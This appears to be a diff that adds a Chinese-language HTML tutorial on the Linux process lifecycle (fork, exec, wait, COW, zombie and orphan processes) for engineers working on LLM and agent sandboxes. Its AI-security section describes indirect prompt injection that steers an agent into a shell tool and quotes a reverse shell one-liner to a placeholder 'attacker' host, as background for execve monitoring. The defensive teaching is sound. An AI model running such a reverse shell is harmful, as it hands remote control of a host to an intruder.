@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<title>Day 02 · 进程深入：生命周期与状态机</title>
+<style>
+  :root {
+    --bg: #fafaf7;
+    --ink: #2a2a2a;
+    --muted: #6b6b6b;
+    --accent: #c2410c;
+    --accent-soft: #fed7aa;
+    --line: #e7e5e0;
+    --card: #ffffff;
+    --code-bg: #f4f1ec;
+    --callout-bg: #fff7ed;
+  }
+  * { box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Helvetica Neue", sans-serif;
+    background: var(--bg);
+    color: var(--ink);
+    line-height: 1.78;
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 48px 32px 80px;
+  }
+  .header {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-left: 6px solid var(--accent);
+    border-radius: 6px;
+    padding: 20px 24px;
+    margin-bottom: 28px;
+  }
+  .header h1 {
+    font-size: 22px;
+    margin: 0 0 8px;
+    color: var(--accent);
+  }
+  .header .meta {
+    font-size: 13px;
+    color: var(--muted);
+    font-family: ui-monospace, "SF Mono", monospace;
+  }
+  .toc {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 6px;
+    padding: 14px 20px;
+    margin: 0 0 32px;
+    font-size: 13.5px;
+  }
+  .toc ol { margin: 4px 0; padding-left: 24px; }
+  .toc a { color: var(--accent); text-decoration: none; }
+  .toc a:hover { text-decoration: underline; }
+  .leadin {
+    background: var(--callout-bg);
+    border-left: 3px solid var(--accent-soft);
+    padding: 14px 18px;
+    border-radius: 4px;
+    margin: 0 0 36px;
+    font-size: 15px;
+  }
+  h2 {
+    font-size: 20px;
+    margin-top: 48px;
+    color: var(--accent);
+    border-left: 4px solid var(--accent);
+    padding-left: 12px;
+  }
+  h3 {
+    font-size: 16.5px;
+    margin-top: 24px;
+    color: #444;
+  }
+  p { margin: 12px 0; }
+  code {
+    background: var(--code-bg);
+    padding: 1px 6px;
+    border-radius: 3px;
+    font-size: 13.5px;
+    font-family: ui-monospace, "SF Mono", monospace;
+  }
+  pre {
+    background: var(--code-bg);
+    padding: 14px 16px;
+    border-radius: 6px;
+    overflow-x: auto;
+    font-size: 13.5px;
+    line-height: 1.55;
+    margin: 16px 0;
+  }
+  pre code { background: transparent; padding: 0; font-size: inherit; }
+  .ascii {
+    font-family: ui-monospace, "SF Mono", monospace;
+    font-size: 13px;
+    background: var(--code-bg);
+    padding: 16px 20px;
+    border-radius: 6px;
+    white-space: pre;
+    overflow-x: auto;
+    line-height: 1.4;
+    margin: 18px 0;
+  }
+  table {
+    border-collapse: collapse;
+    width: 100%;
+    margin: 16px 0;
+    font-size: 14px;
+  }
+  th, td {
+    border: 1px solid var(--line);
+    padding: 10px 12px;
+    text-align: left;
+    vertical-align: top;
+  }
+  th { background: var(--code-bg); font-weight: 600; }
+  .note {
+    background: var(--callout-bg);
+    border-left: 4px solid var(--accent-soft);
+    padding: 12px 18px;
+    border-radius: 4px;
+    margin: 18px 0;
+    font-size: 14.5px;
+  }
+  .connect {
+    background: var(--callout-bg);
+    border-left: 4px solid var(--accent);
+    padding: 18px 22px;
+    border-radius: 4px;
+    margin: 36px 0;
+  }
+  .connect h2 { margin-top: 0; border-left: none; padding-left: 0; }
+  .exercise {
+    background: var(--card);
+    border: 1px solid var(--line);
+    border-radius: 6px;
+    padding: 18px 22px;
+    margin: 16px 0;
+  }
+  .exercise-num {
+    display: inline-block;
+    background: var(--accent);
+    color: white;
+    width: 22px; height: 22px;
+    border-radius: 50%;
+    text-align: center;
+    font-size: 12px;
+    line-height: 22px;
+    margin-right: 8px;
+  }
+  .next {
+    margin-top: 48px;
+    padding: 14px 18px;
+    background: var(--card);
+    border: 1px dashed var(--accent-soft);
+    border-radius: 4px;
+    font-size: 14px;
+    color: var(--muted);
+  }
+  .next strong { color: var(--accent); }
+  .key {
+    background: linear-gradient(transparent 60%, var(--accent-soft) 60%);
+    padding: 0 2px;
+  }
+  ul, ol { padding-left: 24px; }
+  li { margin: 4px 0; }
+  .term { color: var(--accent); font-weight: 600; }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <h1>Day 02 · 进程深入：生命周期与状态机</h1>
+  <div class="meta">Week 01 · 周二 · 2026-05-14 · 主线：操作系统核心 · 预计 1.5h 阅读 + 30min 实操</div>
+</div>
+
+<div class="leadin">
+<strong>今日导读</strong>：昨天我们建立了「进程 = 地址空间 + 资源 + PCB」这个静态视图。今天我们让它动起来——一个进程是怎么<strong>诞生、活着、死去、被收尸</strong>的。你会理解：为什么 Linux 上创建一个新进程要先 fork 再 exec（看似多此一举）；为什么 Python 的 <code>subprocess.Popen</code> 用完不 wait 会留下「僵尸」；为什么 init/systemd 是整个系统的「孤儿院院长」；以及 <code>ps</code> 输出里那个 STAT 列的字母 D 为什么是「最难处理的进程」。这些不是抽象知识——是你后面排查 LLM 服务卡死、设计 Agent 沙箱时反复要用到的工具。
+</div>
+
+<div class="toc">
+<strong>今日目录</strong>
+<ol>
+  <li><a href="#s1">task_struct：进程在内核里长什么样</a></li>
+  <li><a href="#s2">进程状态机：R / S / D / T / Z 五个字母的全部秘密</a></li>
+  <li><a href="#s3">fork：复制一个完整的进程</a></li>
+  <li><a href="#s4">写时复制 COW：为什么 fork 不慢</a></li>
+  <li><a href="#s5">exec：把当前进程「变身」</a></li>
+  <li><a href="#s6">wait / waitpid：回收子进程</a></li>
+  <li><a href="#s7">僵尸进程与孤儿进程</a></li>
+  <li><a href="#s8">进程组与会话（简介）</a></li>
+  <li><a href="#connect">与 AI / Agent 安全的连结</a></li>
+  <li><a href="#exercise">今日小练习</a></li>
+</ol>
+</div>
+
+<h2 id="s1">1. task_struct：进程在内核里长什么样</h2>
+
+<p>昨天提了一句，每个进程在 Linux 内核里都对应一个叫 <code>task_struct</code> 的 C 结构体。今天我们认真看一眼这个东西，因为之后所有讨论都围绕它。</p>
+
+<p>定义在 <code>include/linux/sched.h</code>，整个结构体 ~3000 行、200+ 字段，但你不需要全记，只需要理解 <strong>5 组关键字段</strong>：</p>
+
+<pre><code>struct task_struct {
+    /* ── 组 A：身份标识 ── */
+    pid_t            pid;            // 进程/线程 ID（每个 task 唯一）
+    pid_t            tgid;           // 线程组 ID（同进程的所有线程共享）
+    struct task_struct *real_parent; // 真实父进程指针
+    struct task_struct *parent;      // 当前父进程（可能被 ptrace 改）
+    struct list_head children;       // 子进程链表
+    struct list_head sibling;        // 同父进程下兄弟链表
+
+    /* ── 组 B：当前状态 ── */
+    long             state;          // R / S / D / T / Z（下一节详谈）
+    int              exit_state;     // 退出时的状态
+    int              exit_code;      // 退出码（main 返回值）
+    int              exit_signal;    // 被什么信号杀死的
+
+    /* ── 组 C：资源持有 ── */
+    struct mm_struct      *mm;       // 地址空间（页表、各段位置）
+    struct files_struct   *files;    // 打开的文件描述符表
+    struct signal_struct  *signal;   // 信号处理函数表
+    struct fs_struct      *fs;       // 工作目录、umask
+
+    /* ── 组 D：身份与权限 ── */
+    const struct cred *cred;         // UID/GID/capabilities
+
+    /* ── 组 E：调度与时间 ── */
+    unsigned int     policy;         // SCHED_NORMAL / FIFO / RR
+    int              prio, static_prio, normal_prio;
+    struct sched_entity se;          // CFS 调度实体（含 vruntime）
+    u64              utime, stime;   // 在用户态/内核态累计的 CPU 时间
+
+    /* … 还有 namespace、cgroup、ptrace、性能计数器等等 100+ 字段 */
+};</code></pre>
+
+<p>记几个对今天有用的细节：</p>
+
+<ul>
+  <li><span class="term">pid vs tgid</span>：在 Linux 内核眼里，<strong>线程也是 task</strong>。同一进程的多个线程，每个有自己的 <code>pid</code>（独一无二），但它们共享同一个 <code>tgid</code>（等于线程组里第一个线程的 pid，也就是用户视角的「进程 ID」）。所以你 <code>ps</code> 看到的「进程 PID」其实是 tgid。</li>
+  <li><span class="term">real_parent vs parent</span>：通常一样，但被 <code>strace</code>/<code>gdb</code> ptrace 之后 <code>parent</code> 会指向调试器。后面 wait 信号传递时只看 real_parent。</li>
+  <li><span class="term">mm 字段</span>：指向 <code>mm_struct</code>，里面记录了进程的虚拟地址空间布局（昨天讲的 text/data/heap/stack 各段起止地址、页表入口）。<strong>线程共享同一个 <code>mm_struct</code></strong>——这就是「线程共享内存」的实现机制。</li>
+</ul>
+
+<p>所有这些字段加起来，平均一个进程的 task_struct 大约占 <strong>10-20 KB 内核内存</strong>。你机器上跑 500 个进程，内核就为此用掉 5-10 MB——这是"进程"的固定成本，也是为什么"轻量线程""协程"在高并发场景下被青睐。</p>
+
+<h2 id="s2">2. 进程状态机：R / S / D / T / Z 五个字母的全部秘密</h2>
+
+<p>进程不是一直在跑的。它在生命周期里在几个状态间反复切换。当你 <code>ps aux</code> 看到 <code>STAT</code> 列（mac 上也叫 STAT），那个字母就是当前状态。</p>
+
+<div class="ascii">      ┌──────────────────┐
+   fork│  TASK_NEW (创建中)  │
+      └────────┬─────────┘
+               │
+               ▼
+      ┌──────────────────┐  调度器选中    ┌──────────────────┐
+      │  R: RUNNING     │ ◄──────────► │  R: RUNNABLE     │
+      │ （正在 CPU 上跑） │  时间片到/抢占│ （在 runqueue 里等）│
+      └────────┬─────────┘              └──────────────────┘
+               │
+   等 I/O / 信号 │
+               ▼
+      ┌──────────────────┐   等到了    ┌──────────────────┐
+      │  S: 可中断睡眠   │ ──────────► │  R: RUNNABLE     │
+      │（等网络/sleep）  │             └──────────────────┘
+      └──────────────────┘
+
+      ┌──────────────────┐
+      │  D: 不可中断睡眠  │  ← 等磁盘 IO 等不能被打断的事
+      │（kill -9 都没用）│
+      └──────────────────┘
+
+      ┌──────────────────┐
+      │  T: 被停止       │  ← Ctrl-Z 或 SIGSTOP
+      └──────────────────┘
+
+      ┌──────────────────┐
+      │  Z: 僵尸 zombie  │  ← 已经死了，但父进程还没回收
+      └──────────────────┘</div>
+
+<table>
+<tr><th>字母</th><th>名字</th><th>含义</th><th>什么时候会看到</th></tr>
+<tr><td>R</td><td>Running / Runnable</td><td>正在 CPU 上执行，或者在 runqueue 里等 CPU</td><td>CPU 密集型任务运行时；一切活跃进程</td></tr>
+<tr><td>S</td><td>Sleeping（可中断）</td><td>在等某个事件（网络数据、定时器、IO），<strong>可以被信号唤醒</strong></td><td>绝大多数空闲进程都是 S，比如你的 shell 等你敲键盘</td></tr>
+<tr><td>D</td><td>Uninterruptible sleep</td><td>在等不能被打断的内核操作（绝大多数是磁盘 IO 或者 NFS）。<strong>连 SIGKILL 都杀不动</strong></td><td>磁盘满了、磁盘损坏、NFS 卡死、某些设备驱动 bug</td></tr>
+<tr><td>T</td><td>Stopped</td><td>被 SIGSTOP 信号或者 Ctrl-Z 暂停</td><td>你按 Ctrl-Z 把前台进程挂起；调试器附着时</td></tr>
+<tr><td>Z</td><td>Zombie</td><td>已经 exit 了，但父进程没调 wait 回收，task_struct 还赖在内核里</td><td>父进程写得不规范、Python 用 multiprocessing 后忘 join</td></tr>
+</table>
+
+<div class="note">
+<strong>D 状态特别重要</strong>。它是<strong>排查线上故障最常见的恐怖状态</strong>。一个 D 进程意味着：内核在为它做某个原子操作（往往是 IO），这个操作不能被打断；如果底层硬件挂了（比如磁盘 controller 失联、NFS 服务端 down 了），这个 D 状态可能持续到天荒地老。<strong>这种进程你不能 kill，唯一的办法是修复底层硬件或者重启机器</strong>。当你看到一台机器 load average 飙到几百但 CPU 闲着，八成是一堆进程卡在 D。
+</div>
+
+<h2 id="s3">3. fork：复制一个完整的进程</h2>
+
+<p>Linux 创建新进程<strong>不是「凭空造一个」，而是「复制一个现成的」</strong>。这就是 <code>fork()</code> 系统调用。它的语义非常特别：</p>
+
+<pre><code>#include &lt;unistd.h&gt;
+pid_t fork(void);</code></pre>
+
+<p>调用 <code>fork()</code> 一次，<strong>返回两次</strong>——一次在父进程里返回（值是新创建的子进程 PID），一次在子进程里返回（值是 0）。第一次见这个 API 几乎所有人都会楞住。Python 里大概是这样：</p>
+
+<pre><code>import os
+
+pid = os.fork()       # ← 这一行神奇地"分裂"了
+
+if pid == 0:
+    # 这段代码在子进程里执行
+    print(f"我是子进程，PID={os.getpid()}，我妈是 {os.getppid()}")
+    os._exit(0)
+else:
+    # 这段代码在父进程里执行
+    print(f"我是父进程，PID={os.getpid()}，我刚生了个孩子 PID={pid}")
+    os.waitpid(pid, 0)  # 等子进程死透
+</code></pre>
+
+<p>fork 后的子进程是父进程的<strong>近乎完美的克隆</strong>：</p>
+<ul>
+  <li>地址空间完全一样（同样的 text/data/heap/stack 内容）</li>
+  <li>所有打开的文件描述符（包括同一个 socket 连接，引用计数 +1）</li>
+  <li>同样的环境变量、工作目录、用户身份</li>
+  <li>从同一行代码继续执行（PC 一样）</li>
+</ul>
+
+<p>父子的差异只有几个：PID 不同、ppid 不同、fork 返回值不同、CPU 时间累积清零。</p>
+
+<h3>为什么 Linux 设计成 fork + exec 两步走</h3>
+
+<p>表面看这很奇怪——既然要起一个新程序，为什么不直接「创建+加载」一步到位（像 Windows 的 <code>CreateProcess</code>）？答案是<strong>灵活性</strong>。fork 完之后、exec 之前，你有一个珍贵的窗口：子进程已经是一个独立 task，但还没变成目标程序。你可以在这个窗口里：</p>
+
+<ul>
+  <li>关掉一些不该继承的文件描述符</li>
+  <li>切换用户身份（setuid 降权）</li>
+  <li>改环境变量</li>
+  <li>设置资源限制（rlimit）</li>
+  <li>挂到一个 cgroup 里限制 CPU/内存</li>
+  <li>进入新的 namespace（容器的核心机制）</li>
+</ul>
+
+<p>所有这些「准备工作」做完，再 exec 真正的目标程序——目标程序生来就在受限环境里。这就是 <span class="key">Docker、K8s、systemd 创建容器/服务的标准模式</span>。如果是一步到位的 CreateProcess，你就没机会做这些事。</p>
+
+<h2 id="s4">4. 写时复制 COW：为什么 fork 不慢</h2>
+
+<p>读到这里你应该有个疑问：fork 要复制整个地址空间，一个 10GB 内存的进程 fork 一下不就要复制 10GB 吗？那 fork 不就慢死了？</p>
+
+<p>答案是 <span class="term">Copy-On-Write（写时复制，COW）</span>。Linux 不真的复制内存，它只复制<strong>页表</strong>，然后把所有页都标成「只读」。父子两个进程指向<strong>同一份物理内存</strong>。</p>
+
+<div class="ascii">fork 之前：
+  父进程虚拟地址 ─► [页表] ─► 物理内存页 (rw)
+
+fork 之后（瞬间完成，几乎不耗时间）：
+  父进程虚拟地址 ─► [页表 P] ─┐
+                              ├──► 同一份物理内存页 (现在标成 ro)
+  子进程虚拟地址 ─► [页表 C] ─┘
+
+任一方写入时，CPU 触发 page fault：
+  ① 内核分配一个新物理页
+  ② 把旧页内容拷贝到新页
+  ③ 改写发起方的页表，指向新页（恢复 rw）
+  ④ 重试那条写指令
+  ⑤ 两边从此分道扬镳</div>
+
+<p>这个机制的妙处是：</p>
+
+<ol>
+  <li><strong>fork 本身 O(进程页表大小)，跟实际内存使用量基本无关</strong>。一个 10GB 进程 fork 跟一个 10MB 进程 fork 一样快（~微秒级）。</li>
+  <li><strong>如果 fork 后立即 exec，根本不会触发任何复制</strong>——exec 会丢弃旧地址空间装载新程序，浪费的页全部回收。这就是 fork+exec 模式高效的根本原因。</li>
+  <li><strong>父子如果都是只读访问（比如读同一份模型权重），物理内存只有一份</strong>。这就是为什么 vLLM、DataLoader 用 fork 起 worker 比 spawn 省内存——子进程能"白嫖"父进程已经加载的模型权重，直到它们写入才会真正复制。</li>
+</ol>
+
+<div class="note">
+<strong>但 COW 有一个 LLM 工程师必须知道的坑</strong>：Python 的引用计数会"破坏"COW。CPython 给每个对象都维护一个 refcount，访问对象（哪怕只是读）也会改 refcount——这是一次<strong>写操作</strong>。所以 Python 子进程"读"父进程加载的大对象（比如 numpy 数组、torch tensor），会触发整页 COW，内存优势被吃掉。这就是 PyTorch DataLoader 默认用 <code>fork</code> 但你看监控会发现内存涨得飞快的原因。
+</div>
+
+<h2 id="s5">5. exec：把当前进程「变身」</h2>
+
+<p>exec 是一个<strong>系统调用家族</strong>（execve、execvp、execl 等，glibc 提供的方便变体），核心是 <code>execve()</code>：</p>
+
+<pre><code>int execve(const char *path,           // 可执行文件路径
+           char *const argv[],         // 命令行参数
+           char *const envp[]);        // 环境变量</code></pre>
+
+<p>它做的事简单粗暴：<strong>用一个新程序替换掉当前进程的所有代码和数据</strong>。具体来说：</p>
+
+<ol>
+  <li>检查可执行文件的权限、ELF 头合法性</li>
+  <li>检查 setuid / setgid 位，必要时切换权限</li>
+  <li>丢弃当前进程的整个地址空间（mm_struct 整个重建）</li>
+  <li>把新可执行文件的 text/data 段 mmap 到新地址空间</li>
+  <li>把命令行参数和环境变量复制到新栈顶</li>
+  <li>把 PC 设到新程序的 entry point（动态链接器 <code>ld-linux.so</code>）</li>
+  <li>从那里开始执行</li>
+</ol>
+
+<p>注意 <strong>execve 成功就不返回</strong>——返回到哪里去呢？原来的代码已经被覆盖了。只有失败（比如文件不存在）才会返回 -1。</p>
+
+<p>什么东西在 exec 之后<strong>保留</strong>？task_struct 自己（pid、ppid、children 关系）、已打开的文件描述符（除非设了 <code>O_CLOEXEC</code>）、信号 mask、cgroup/namespace 归属、资源限制 rlimit。<strong>什么东西被清掉</strong>：地址空间、信号处理函数（除了忽略的 SIG_IGN）、内存锁。</p>
+
+<h2 id="s6">6. wait / waitpid：回收子进程</h2>
+
+<p>父进程通过 wait 家族系统调用「等待」子进程结束并回收其残余资源：</p>
+
+<pre><code>pid_t wait(int *status);                        // 等任意一个子进程
+pid_t waitpid(pid_t pid, int *status, int options); // 等指定子进程，可非阻塞
+int waitid(idtype_t, id_t, siginfo_t*, int);    // 更通用的版本</code></pre>
+
+<p>关键点：</p>
+
+<ul>
+  <li>父进程<strong>必须</strong>调 wait 才能得到子进程的退出码（<code>status</code> 里编码），否则丢了。</li>
+  <li>wait 不仅是"得知结果"，<strong>更是回收子进程的 task_struct</strong>。子进程 exit 时它不是立刻消失，而是变成 Z 状态，等父进程 wait 才彻底释放。</li>
+  <li>用 <code>WNOHANG</code> 选项可以让 waitpid 非阻塞——"如果子进程还没死就立刻返回，别等"。</li>
+</ul>
+
+<pre><code># Python 里典型用法
+import subprocess
+
+p = subprocess.Popen(['sleep', '1'])
+return_code = p.wait()      # 阻塞直到子进程结束，自动 reap
+
+# 或者非阻塞轮询
+while p.poll() is None:     # poll() 内部用 waitpid + WNOHANG
+    print("还在跑...")
+    time.sleep(0.1)</code></pre>
+
+<h2 id="s7">7. 僵尸进程与孤儿进程</h2>
+
+<h3>僵尸（Zombie）</h3>
+
+<p>子进程 exit 之后到父进程 wait 之前的这段时间，子进程的状态是 <strong>Z</strong>。它"已经死了，但还没下葬"：</p>
+
+<ul>
+  <li>地址空间已经被回收（不占内存）</li>
+  <li>但 task_struct 还在（占几 KB 内核内存 + 一个 PID）</li>
+  <li>状态字段记录了退出码，等父进程来取</li>
+</ul>
+
+<p>正常情况僵尸状态非常短，<strong>父进程一 wait 就消失</strong>。但如果父进程写得不规范——比如开了很多子进程从不 wait——僵尸就会堆积。一旦堆到系统 PID 上限（<code>/proc/sys/kernel/pid_max</code>，通常 32768），系统就再也 fork 不出新进程，<strong>整个机器瘫痪</strong>。</p>
+
+<pre><code># 查系统现存僵尸
+ps aux | awk '$8 ~ /Z/ { print }'
+
+# 或者
+ps -eo pid,ppid,state,comm | grep ' Z '</code></pre>
+
+<h3>孤儿（Orphan）</h3>
+
+<p>如果父进程<strong>先于子进程死掉</strong>（不管是正常退出还是被 kill），子进程就成了「孤儿」。孤儿不会立刻死，但它没爸了，谁来 wait 它？</p>
+
+<p>Linux 的答案：<strong>所有孤儿被自动过继给 PID=1 的 init 进程</strong>（现代发行版上是 <code>systemd</code>）。init 的设计职责之一就是「永远在循环 wait()」，所以孤儿一旦 exit 立刻被收尸，不会变成僵尸。</p>
+
+<div class="ascii">正常情况：
+  init (PID=1) ───── shell ───── python (你) ───── 子进程
+                                                      │
+                                                  exit 后
+                                                      ▼
+                                          shell 调 wait 回收 ✓
+
+父进程先死：
+  init (PID=1) ───── shell ──×── python (你) ───── 子进程
+                                                      │
+                              ↓ 父进程没了，孤儿过继给 init
+                                                      │
+  init (PID=1) ──────────────────────────────────── 子进程
+                                                      │
+                                                   exit 后
+                                                      ▼
+                                          init 调 wait 回收 ✓</div>
+
+<p>这个机制非常重要——它保证<strong>系统永远不会因为孤儿堆积而垮掉</strong>。但有个陷阱：</p>
+
+<div class="note">
+<strong>容器场景里的 PID 1 问题</strong>。容器里你的应用通常以 PID=1 启动（容器的 PID namespace 从 1 开始）。但你的 Python 应用<strong>不是 init</strong>——它不会自动循环 wait()。如果你的 Python 起了子进程然后子进程死了，<strong>那些僵尸就堆在你 Python 进程下，没人收</strong>。这就是为什么容器圈推荐用 <code>tini</code>、<code>dumb-init</code> 之类的"mini init"作为 PID 1：它把你的实际程序 fork 出来当孩子，自己负责收尸。
+</div>
+
+<h2 id="s8">8. 进程组与会话（简介）</h2>
+
+<p>这部分日常用不上，但你做信号处理、终端交互时会撞到，先建立概念，将来需要再深挖：</p>
+
+<ul>
+  <li><span class="term">进程组（Process Group）</span>：一组相关的进程，由一个 <strong>process group leader</strong> 领导。在 shell 里你跑 <code>cat file | grep foo | wc</code>，这三个进程是同一个进程组。这样设计是为了<strong>批量发信号</strong>——你按 Ctrl-C，shell 给整个前台进程组发 SIGINT，所有进程一起退出。</li>
+  <li><span class="term">会话（Session）</span>：一组进程组，通常对应一次"登录会话"。一个 session 关联一个<strong>控制终端</strong>，关闭终端时 session 里所有进程组会收到 SIGHUP。<code>nohup</code> 命令就是为了让进程脱离 session，避免被这个信号杀掉。</li>
+  <li><span class="term">守护进程（daemon）</span>：脱离了所有控制终端的后台进程。创建一个 daemon 的标准 11 步流程（fork、setsid、再 fork、chdir、umask、关闭 fd…）就是为了切干净这些关系，让进程独立于任何 session 存活。</li>
+</ul>
+
+<p>想跑实验？在 mac 终端跑 <code>ps -j</code>，看 PGID 和 SID 两列，它们就分别是进程组和会话 ID。</p>
+
+<div class="connect" id="connect">
+<h2>🔗 与 AI / Agent 安全的连结</h2>
+
+<p><strong>1. Agent 沙箱的标准实现模式</strong>。当 LLM Agent 要执行用户/模型生成的代码（code interpreter、tool execution），生产级实现都遵循同一个模板：parent <strong>fork()</strong> → child 在 fork 后立刻 <strong>setrlimit</strong>（限制 CPU 时间、内存、fd 数、子进程数）→ <strong>unshare</strong> 切到独立 namespace → <strong>cgroups</strong> 加资源墙 → 装 <strong>seccomp</strong> filter 屏蔽危险 syscall → <strong>setuid</strong> 降权到 nobody → <strong>execve</strong> 装载实际代码 → parent 用 <strong>waitpid(WNOHANG + timeout)</strong> 监控。任何一步省略都会留下逃逸窗口。你今天学的 fork/exec/wait 就是这整套机制的骨架。</p>
+
+<p><strong>2. 排查 LLM 服务"卡死"的第一招就是看 STAT</strong>。线上经常遇到「vLLM 进程在跑但请求全部 timeout」。第一步 <code>ps -eo pid,state,wchan,cmd | grep vllm</code>：如果是 R 但延迟高，CPU/GPU 瓶颈；如果是 S 在 socket 上等，是网络问题；如果是 <strong>D</strong>，几乎肯定是磁盘 IO 出问题——通常是模型权重所在 NFS 抖动或者 SSD 写满了。今天 D 状态那段记忆要深。</p>
+
+<p><strong>3. 容器里的 PID 1 问题正中 LLM 服务要害</strong>。Python LLM 服务（FastAPI / vLLM）经常起子进程（编译 CUDA kernel、调用外部工具）。如果直接 <code>CMD ["python", "server.py"]</code>，Python 当 PID 1，子进程死了变僵尸，运行几天后 fork 失败、整服务挂掉。<strong>正确做法是 <code>ENTRYPOINT ["tini", "--"]</code></strong>——这是个不显眼但能救命的细节，背景就是今天讲的"孤儿过继给 init"机制。</p>
+
+<p><strong>4. fork 是 prompt injection 攻击者的最爱终点</strong>。攻击者通过 indirect prompt injection 让 Agent 调到某个 shell 类 tool，下一步几乎一定是 fork + exec 起一个反弹 shell（<code>sh -i &gt;& /dev/tcp/attacker/4444 0&gt;&1</code>）。检测层的关键就是<strong>在 execve 这个 syscall 上设关卡</strong>——任何 LLM 触发的 execve 都打日志 + 审查路径和参数。这就是 Week 2 周六我们要讲的 eBPF + Falco 的最大用武之地。</p>
+
+<p><strong>5. Python multiprocessing 的 fork vs spawn 取舍</strong>。<code>multiprocessing.set_start_method('fork')</code> 走今天讲的 fork 路径，子进程白嫖父进程已加载的模型；<code>'spawn'</code> 走 fork+exec，子进程从零启动 Python 解释器、重新 import 一切，慢一两秒但<strong>更干净</strong>（避免 fork 后的状态污染、CUDA context 在 fork 后不可用的问题）。<strong>在 GPU 场景下基本必须用 spawn</strong>——这是个反复有人踩坑的经典问题，根源就在今天的 fork 语义。</p>
+</div>
+
+<h2 id="exercise">📝 今日小练习</h2>
+
+<div class="exercise">
+<p><span class="exercise-num">1</span><strong>10 分钟 · 制造一个僵尸</strong></p>
+<p>在你的 mac 终端跑下面这段 Python，然后另开一个终端用 <code>ps</code> 观察：</p>
+<pre><code># zombie_demo.py
+import os, time
+
+pid = os.fork()
+if pid == 0:
+    # 子进程：立刻退出
+    print(f"child {os.getpid()} exiting")
+    os._exit(0)
+else:
+    # 父进程：故意不 wait，睡 60 秒
+    print(f"parent {os.getpid()} sleeping, child pid = {pid}")
+    time.sleep(60)
+    # （正常的代码应该在这里调 os.waitpid(pid, 0)）</code></pre>
+<p>跑起来后，另开终端：</p>
+<pre><code>ps -p &lt;子进程PID&gt; -o pid,ppid,state,command
+# 你应该看到 state = Z（mac 上可能显示为 ?Z）</code></pre>
+<p>问题：在父进程睡眠期间这个僵尸一直存在；等父进程睡完退出，僵尸消失了——为什么？提示：回顾「孤儿过继给 init，init 立刻收尸」。</p>
+</div>
+
+<div class="exercise">
+<p><span class="exercise-num">2</span><strong>15 分钟 · 看一次 fork+exec 的完整 syscall</strong></p>
+<p>Linux 机器上跑（mac 上可以用 dtruss 替代）：</p>
+<pre><code>strace -f -e trace=clone,execve,wait4,exit,exit_group bash -c 'ls /tmp &gt; /dev/null'</code></pre>
+<p>你会看到 bash 先 <code>clone</code>（即 fork），子进程 <code>execve("/usr/bin/ls", …)</code>，bash 这边 <code>wait4</code>，子进程跑完 <code>exit_group</code>，bash 的 <code>wait4</code> 返回。</p>
+<p>问题：这个序列里哪一步最贵（耗时最多）？为什么 bash 不直接 execve 而要先 clone？</p>
+</div>
+
+<div class="exercise">
+<p><span class="exercise-num">3</span><strong>5 分钟 · 思考题（Agent 安全场景）</strong></p>
+<p>你设计一个 LLM Agent 执行 Python tool 的沙箱。下面四种实现方案，从最不安全到最安全排序：</p>
+<ol type="A">
+  <li>在主进程里 <code>exec(user_code)</code></li>
+  <li>启动一个独立 Python 子进程（<code>subprocess.Popen(['python', '-c', user_code])</code>），不做额外限制</li>
+  <li>同 B，但 fork 后先 <code>setrlimit</code> 限制 CPU 时间 + 内存，再 exec</li>
+  <li>同 C，但 fork 后还 <code>unshare</code> 切独立 namespace + 装 seccomp filter，再 exec</li>
+</ol>
+<p>对每种方案，说明攻击者要绕过它需要做什么。</p>
+</div>
+
+<div class="next">
+<strong>明日预告 · Day 03 · 周三 · 线程模型与 Python GIL</strong>。我们会拆解「线程是怎么从内核视角实现的」——Linux 没有"线程"这个对象，它用 <code>clone()</code> 的不同 flag 把"进程"和"线程"统一起来。然后深入 CPython 的 GIL：它到底锁了什么、为什么 CPU 密集任务被它害惨、为什么 IO 密集任务感觉不到、Python 3.13 的 no-GIL 实验进展如何。最后讲协程是怎么用一个线程 + 用户态调度模拟出"几万个并发"的。
+</div>
+
+</body>
+</html>
